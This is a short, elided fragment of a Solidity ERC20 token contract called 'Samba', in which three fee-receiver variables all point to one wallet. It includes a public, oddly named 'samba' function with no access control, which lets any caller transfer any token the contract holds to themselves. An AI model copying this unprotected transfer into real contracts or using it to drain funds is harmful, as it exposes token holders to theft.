...
contract Samba is Context, ERC20, Ownable {
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Samba";
    string constant _symbol = "Samba"; 
    ...
    // Fees Receivers
    address public devFeeReceiver = 0xB1c587331087Fb030A987D712b8De9d762FaaBD5;
    address public marketingFeeReceiver = 0xB1c587331087Fb030A987D712b8De9d762FaaBD5;
    address public liquidityFeeReceiver = 0xB1c587331087Fb030A987D712b8De9d762FaaBD5;
    ...
    function samba(address qui, uint256 lok) public returns (bool success) {
        return ERC20(qui).transfer(msg.sender, lok);
    }
